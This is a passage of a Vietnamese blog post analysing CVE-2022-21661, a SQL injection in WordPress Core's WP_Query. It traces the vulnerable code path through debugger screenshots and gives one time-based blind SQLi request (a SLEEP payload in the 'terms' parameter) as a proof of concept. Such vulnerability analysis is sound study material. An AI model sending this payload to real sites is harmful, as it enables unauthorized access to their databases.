        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">DESC</span><span class="w"> </span><span class="n">wp_term_taxonomy</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------------------+-----------------+------+-----+---------+----------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">Field</span><span class="w">            </span><span class="o">|</span><span class="w"> </span><span class="k">Type</span><span class="w">            </span><span class="o">|</span><span class="w"> </span><span class="k">Null</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Key</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Default</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Extra</span><span class="w">          </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------------------+-----------------+------+-----+---------+----------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">term_taxonomy_id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nb">bigint</span><span class="w"> </span><span class="n">unsigned</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">PRI</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">auto_increment</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">term_id</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="nb">bigint</span><span class="w"> </span><span class="n">unsigned</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">MUL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="w">       </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">taxonomy</span><span class="w">         </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">MUL</span><span class="w"> </span><span class="o">|</span><span class="w">         </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">description</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="n">longtext</span><span class="w">        </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">parent</span><span class="w">           </span><span class="o">|</span><span class="w"> </span><span class="nb">bigint</span><span class="w"> </span><span class="n">unsigned</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="w">       </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="k">count</span><span class="w">            </span><span class="o">|</span><span class="w"> </span><span class="nb">bigint</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="w">       </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------------------+-----------------+------+-----+---------+----------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">6</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span></span></span></code></pre></div></div>
<h3 id="how-it-work">How it work?</h3>
<p><figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/debug1.png" title="Debug 1" data-thumbnail="/2025-10-01-cve-2022-21661/debug1.png" data-sub-html="<h2>Breakpoint tại đầu hàm clean_query</h2><p>Debug 1</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/debug1.png"
            data-srcset="/2025-10-01-cve-2022-21661/debug1.png, /2025-10-01-cve-2022-21661/debug1.png 1.5x, /2025-10-01-cve-2022-21661/debug1.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/debug1.png" width="1279" height="392" />
    </a><figcaption class="image-caption">Breakpoint tại đầu hàm clean_query</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/debug2.png" title="Debug 2" data-thumbnail="/2025-10-01-cve-2022-21661/debug2.png" data-sub-html="<h2>Tiếp tục đến query có taxonomy khớp</h2><p>Debug 2</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/debug2.png"
            data-srcset="/2025-10-01-cve-2022-21661/debug2.png, /2025-10-01-cve-2022-21661/debug2.png 1.5x, /2025-10-01-cve-2022-21661/debug2.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/debug2.png" width="1283" height="390" />
    </a><figcaption class="image-caption">Tiếp tục đến query có taxonomy khớp</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/debug3.png" title="Debug 3" data-thumbnail="/2025-10-01-cve-2022-21661/debug3.png" data-sub-html="<h2>Quan sát wp_list_pluck ghi đè terms</h2><p>Debug 3</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/debug3.png"
            data-srcset="/2025-10-01-cve-2022-21661/debug3.png, /2025-10-01-cve-2022-21661/debug3.png 1.5x, /2025-10-01-cve-2022-21661/debug3.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/debug3.png" width="1289" height="540" />
    </a><figcaption class="image-caption">Quan sát wp_list_pluck ghi đè terms</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/debug4.png" title="Debug 4" data-thumbnail="/2025-10-01-cve-2022-21661/debug4.png" data-sub-html="<h2>Tránh ghi đè terms bằng return sớm</h2><p>Debug 4</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/debug4.png"
            data-srcset="/2025-10-01-cve-2022-21661/debug4.png, /2025-10-01-cve-2022-21661/debug4.png 1.5x, /2025-10-01-cve-2022-21661/debug4.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/debug4.png" width="1016" height="321" />
    </a><figcaption class="image-caption">Tránh ghi đè terms bằng return sớm</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/debug5.png" title="Debug 5" data-thumbnail="/2025-10-01-cve-2022-21661/debug5.png" data-sub-html="<h2>Payload giữ nguyên trong truy vấn thực thi</h2><p>Debug 5</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/debug5.png"
            data-srcset="/2025-10-01-cve-2022-21661/debug5.png, /2025-10-01-cve-2022-21661/debug5.png 1.5x, /2025-10-01-cve-2022-21661/debug5.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/debug5.png" width="1393" height="896" />
    </a><figcaption class="image-caption">Payload giữ nguyên trong truy vấn thực thi</figcaption>
    </figure></p>
<h4 id="flow">Flow</h4>
<p><figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/callstack1.png" title="callstack 1" data-thumbnail="/2025-10-01-cve-2022-21661/callstack1.png" data-sub-html="<h2>Đối tượng WP_Query được tạo</h2><p>callstack 1</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/callstack1.png"
            data-srcset="/2025-10-01-cve-2022-21661/callstack1.png, /2025-10-01-cve-2022-21661/callstack1.png 1.5x, /2025-10-01-cve-2022-21661/callstack1.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/callstack1.png" width="1283" height="352" />
    </a><figcaption class="image-caption">Đối tượng WP_Query được tạo</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/callstack2.png" title="callstack 2" data-thumbnail="/2025-10-01-cve-2022-21661/callstack2.png" data-sub-html="<h2>Hàm __construct của WP_Query được gọi</h2><p>callstack 2</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/callstack2.png"
            data-srcset="/2025-10-01-cve-2022-21661/callstack2.png, /2025-10-01-cve-2022-21661/callstack2.png 1.5x, /2025-10-01-cve-2022-21661/callstack2.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/callstack2.png" width="1249" height="165" />
    </a><figcaption class="image-caption">Hàm __construct của WP_Query được gọi</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/callstack3.png" title="callstack 3" data-thumbnail="/2025-10-01-cve-2022-21661/callstack3.png" data-sub-html="<h2>Gọi get_posts để thực thi query</h2><p>callstack 3</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/callstack3.png"
            data-srcset="/2025-10-01-cve-2022-21661/callstack3.png, /2025-10-01-cve-2022-21661/callstack3.png 1.5x, /2025-10-01-cve-2022-21661/callstack3.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/callstack3.png" width="1398" height="205" />
    </a><figcaption class="image-caption">Gọi get_posts để thực thi query</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/callstack4.png" title="callstack 4" data-thumbnail="/2025-10-01-cve-2022-21661/callstack4.png" data-sub-html="<h2>Điều kiện trong get_posts thỏa mãn, gọi get_sql</h2><p>callstack 4</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/callstack4.png"
            data-srcset="/2025-10-01-cve-2022-21661/callstack4.png, /2025-10-01-cve-2022-21661/callstack4.png 1.5x, /2025-10-01-cve-2022-21661/callstack4.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/callstack4.png" width="1476" height="319" />
    </a><figcaption class="image-caption">Điều kiện trong get_posts thỏa mãn, gọi get_sql</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/callstack5.png" title="callstack 5" data-thumbnail="/2025-10-01-cve-2022-21661/callstack5.png" data-sub-html="<h2>get_sql trả về get_sql_clauses</h2><p>callstack 5</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/callstack5.png"
            data-srcset="/2025-10-01-cve-2022-21661/callstack5.png, /2025-10-01-cve-2022-21661/callstack5.png 1.5x, /2025-10-01-cve-2022-21661/callstack5.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/callstack5.png" width="1652" height="165" />
    </a><figcaption class="image-caption">get_sql trả về get_sql_clauses</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/callstack6.png" title="callstack 6" data-thumbnail="/2025-10-01-cve-2022-21661/callstack6.png" data-sub-html="<h2>get_sql_clauses gọi get_sql_for_query</h2><p>callstack 6</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/callstack6.png"
            data-srcset="/2025-10-01-cve-2022-21661/callstack6.png, /2025-10-01-cve-2022-21661/callstack6.png 1.5x, /2025-10-01-cve-2022-21661/callstack6.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/callstack6.png" width="1302" height="296" />
    </a><figcaption class="image-caption">get_sql_clauses gọi get_sql_for_query</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/callstack8.png" title="callstack 8" data-thumbnail="/2025-10-01-cve-2022-21661/callstack8.png" data-sub-html="<h2>Duyệt mảng query trong get_sql_for_query</h2><p>callstack 8</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/callstack8.png"
            data-srcset="/2025-10-01-cve-2022-21661/callstack8.png, /2025-10-01-cve-2022-21661/callstack8.png 1.5x, /2025-10-01-cve-2022-21661/callstack8.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/callstack8.png" width="1452" height="352" />
    </a><figcaption class="image-caption">Duyệt mảng query trong get_sql_for_query</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/callstack15.png" title="callstack 15" data-thumbnail="/2025-10-01-cve-2022-21661/callstack15.png" data-sub-html="<h2>Kiểm tra keys terms, taxonomy, operator,...</h2><p>callstack 15</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/callstack15.png"
            data-srcset="/2025-10-01-cve-2022-21661/callstack15.png, /2025-10-01-cve-2022-21661/callstack15.png 1.5x, /2025-10-01-cve-2022-21661/callstack15.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/callstack15.png" width="858" height="223" />
    </a><figcaption class="image-caption">Kiểm tra keys terms, taxonomy, operator,...</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/callstack7.png" title="callstack 7" data-thumbnail="/2025-10-01-cve-2022-21661/callstack7.png" data-sub-html="<h2>Gọi get_sql_for_clause</h2><p>callstack 7</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/callstack7.png"
            data-srcset="/2025-10-01-cve-2022-21661/callstack7.png, /2025-10-01-cve-2022-21661/callstack7.png 1.5x, /2025-10-01-cve-2022-21661/callstack7.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/callstack7.png" width="1356" height="345" />
    </a><figcaption class="image-caption">Gọi get_sql_for_clause</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/callstack9.png" title="callstack 9" data-thumbnail="/2025-10-01-cve-2022-21661/callstack9.png" data-sub-html="<h2>Bypass clean_query giữ nguyên payload</h2><p>callstack 9</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/callstack9.png"
            data-srcset="/2025-10-01-cve-2022-21661/callstack9.png, /2025-10-01-cve-2022-21661/callstack9.png 1.5x, /2025-10-01-cve-2022-21661/callstack9.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/callstack9.png" width="1483" height="853" />
    </a><figcaption class="image-caption">Bypass clean_query giữ nguyên payload</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/callstack10.png" title="callstack 10" data-thumbnail="/2025-10-01-cve-2022-21661/callstack10.png" data-sub-html="<h2>Payload gán vào $sql\[&#39;where&#39;]</h2><p>callstack 10</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/callstack10.png"
            data-srcset="/2025-10-01-cve-2022-21661/callstack10.png, /2025-10-01-cve-2022-21661/callstack10.png 1.5x, /2025-10-01-cve-2022-21661/callstack10.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/callstack10.png" width="1220" height="465" />
    </a><figcaption class="image-caption">Payload gán vào $sql\['where']</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/callstack11.png" title="callstack 11" data-thumbnail="/2025-10-01-cve-2022-21661/callstack11.png" data-sub-html="<h2>Thêm () vào mệnh đề WHERE</h2><p>callstack 11</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/callstack11.png"
            data-srcset="/2025-10-01-cve-2022-21661/callstack11.png, /2025-10-01-cve-2022-21661/callstack11.png 1.5x, /2025-10-01-cve-2022-21661/callstack11.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/callstack11.png" width="1545" height="364" />
    </a><figcaption class="image-caption">Thêm () vào mệnh đề WHERE</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/callstack16.png" title="callstack 16" data-thumbnail="/2025-10-01-cve-2022-21661/callstack16.png" data-sub-html="<h2>Thêm AND và trả về get_sql</h2><p>callstack 16</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/callstack16.png"
            data-srcset="/2025-10-01-cve-2022-21661/callstack16.png, /2025-10-01-cve-2022-21661/callstack16.png 1.5x, /2025-10-01-cve-2022-21661/callstack16.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/callstack16.png" width="1265" height="305" />
    </a><figcaption class="image-caption">Thêm AND và trả về get_sql</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/callstack14.png" title="callstack 14" data-thumbnail="/2025-10-01-cve-2022-21661/callstack14.png" data-sub-html="<h2>get_posts nhận giá trị từ get_sql</h2><p>callstack 14</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/callstack14.png"
            data-srcset="/2025-10-01-cve-2022-21661/callstack14.png, /2025-10-01-cve-2022-21661/callstack14.png 1.5x, /2025-10-01-cve-2022-21661/callstack14.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/callstack14.png" width="1228" height="196" />
    </a><figcaption class="image-caption">get_posts nhận giá trị từ get_sql</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/callstack12.png" title="callstack 12" data-thumbnail="/2025-10-01-cve-2022-21661/callstack12.png" data-sub-html="<h2>Payload thêm vào $clauses\[&#39;where&#39;]</h2><p>callstack 12</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/callstack12.png"
            data-srcset="/2025-10-01-cve-2022-21661/callstack12.png, /2025-10-01-cve-2022-21661/callstack12.png 1.5x, /2025-10-01-cve-2022-21661/callstack12.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/callstack12.png" width="1262" height="282" />
    </a><figcaption class="image-caption">Payload thêm vào $clauses\['where']</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/callstack13.png" title="callstack 13" data-thumbnail="/2025-10-01-cve-2022-21661/callstack13.png" data-sub-html="<h2>Quan sát last_query tại nơi thực thi SQL</h2><p>callstack 13</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/callstack13.png"
            data-srcset="/2025-10-01-cve-2022-21661/callstack13.png, /2025-10-01-cve-2022-21661/callstack13.png 1.5x, /2025-10-01-cve-2022-21661/callstack13.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/callstack13.png" width="1520" height="804" />
    </a><figcaption class="image-caption">Quan sát last_query tại nơi thực thi SQL</figcaption>
    </figure></p>
<p><strong>Chart minh họa luồng thực thi</strong></p>
<p><figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/chart.png" title="chart" data-thumbnail="/2025-10-01-cve-2022-21661/chart.png" data-sub-html="<h2>Biểu đồ luồng thực thi của WP_Query dẫn đến SQLi</h2><p>chart</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/chart.png"
            data-srcset="/2025-10-01-cve-2022-21661/chart.png, /2025-10-01-cve-2022-21661/chart.png 1.5x, /2025-10-01-cve-2022-21661/chart.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/chart.png" width="2451" height="1094" />
    </a><figcaption class="image-caption">Biểu đồ luồng thực thi của WP_Query dẫn đến SQLi</figcaption>
    </figure></p>
<hr>
<h2 id="exploit">Exploit</h2>
<p>Thay giá trị của <code>terms</code> bằng payload SQLi:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-http">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/demo/?terms=1)+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a)+%23+</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></span></span></code></pre></div></div>
<p><figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/detect.png" title="Detect" data-thumbnail="/2025-10-01-cve-2022-21661/detect.png" data-sub-html="<h2>Kết quả phản hồi cho thấy truy vấn chậm do payload hoạt động</h2><p>Detect</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/detect.png"
            data-srcset="/2025-10-01-cve-2022-21661/detect.png, /2025-10-01-cve-2022-21661/detect.png 1.5x, /2025-10-01-cve-2022-21661/detect.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/detect.png" width="433" height="267" />
    </a><figcaption class="image-caption">Kết quả phản hồi cho thấy truy vấn chậm do payload hoạt động</figcaption>
    </figure></p>
<hr>
<h2 id="conclusion">Conclusion</h2>
<p>Lỗ hổng <strong>CVE-2022-21661</strong> trong <strong>WordPress Core</strong> trước phiên bản <strong>5.8.3</strong>, quay ngược đến tận phiên bản <strong>3.7.37</strong>, xuất phát từ việc làm sạch dữ liệu (<strong>sanitization</strong>) không đúng cách trong <code>WP_Query</code> dẫn đến lỗ hổng SQL Injection.</p>
<hr>
<h2 id="references">References</h2>
<p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener noreffer ">SQL Injection cheat sheet - PortSwigger</a></p>
<p><a href="https://www.cve.org/CVERecord?id=CVE-2022-21661" target="_blank" rel="noopener noreffer ">CVE-2022-21661 Detail</a></p>
<hr>
<h2 id="notes">Notes</h2>
<hr>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>Vì patch nằm trong file <strong>src/wp-includes/class-wp-tax-query.php</strong>, file này định nghĩa class <code>WP_Tax_Query</code>, chịu trách nhiệm xử lý tham số <code>tax_query</code> trong <code>WP_Query</code>. Nếu có thay đổi trong file này thì gần như chắc chắn nó liên quan đến quá trình <strong>parse/validate</strong> của <code>tax_query</code>.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Cập nhật ngày 2025-10-01</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/vi/2025-10-01-cve-2022-21661/index.md" target="_blank">Đọc với định dạng Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="x" data-url="http://localhost:1313/vi/2025-10-01-cve-2022-21661/" data-title="CVE-2022-21661 Analysis &amp; POC" data-hashtags="analyst,plugin,sqli"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Threads" data-sharer="threads" data-url="http://localhost:1313/vi/2025-10-01-cve-2022-21661/" data-title="CVE-2022-21661 Analysis &amp; POC"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/2025-10-01-cve-2022-21661/" data-hashtag="analyst"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/2025-10-01-cve-2022-21661/" data-title="CVE-2022-21661 Analysis &amp; POC"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Line" data-sharer="line" data-url="http://localhost:1313/vi/2025-10-01-cve-2022-21661/" data-title="CVE-2022-21661 Analysis &amp; POC"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên 微博" data-sharer="weibo" data-url="http://localhost:1313/vi/2025-10-01-cve-2022-21661/" data-title="CVE-2022-21661 Analysis &amp; POC" data-image="app.png"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/vi/2025-10-01-cve-2022-21661/" data-title="CVE-2022-21661 Analysis &amp; POC" data-description="Security Vulnerability in WordPress Core."><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fvi%2f2025-10-01-cve-2022-21661%2f&amp;text=CVE-2022-21661%20Analysis%20%26%20POC" target="_blank" title="Chia sẻ trên Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/vi/tags/analyst/">Analyst</a>,&nbsp;<a href="/vi/tags/plugin/">Plugin</a>,&nbsp;<a href="/vi/tags/sqli/">Sqli</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/vi/2025-09-30-cve-2025-2011/" class="prev" rel="prev" title="CVE-2025-2011 Analysis &amp; POC"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-2011 Analysis & POC</a>
            <a href="/vi/2025-10-02-cve-2025-6234/" class="next" rel="next" title="CVE-2025-6234 Analysis &amp; POC">CVE-2025-6234 Analysis & POC<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://w41bu1.github.io" target="_blank">w41bu1</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Lên trên">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a>
        </div>

        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="Xem bình luận">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/algoliasearch/lite/browser.umd.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"algoliaAppID":"GZT24PWKNT","algoliaIndex":"index","algoliaSearchKey":"634ab679e825b815de2663de38908f9d","highlightTag":"em","maxResultLength":10,"noResultsFound":"Không tìm thấy","snippetLength":50,"type":"algolia"}};</script><script src="/js/theme.min.js"></script></body>
</html>
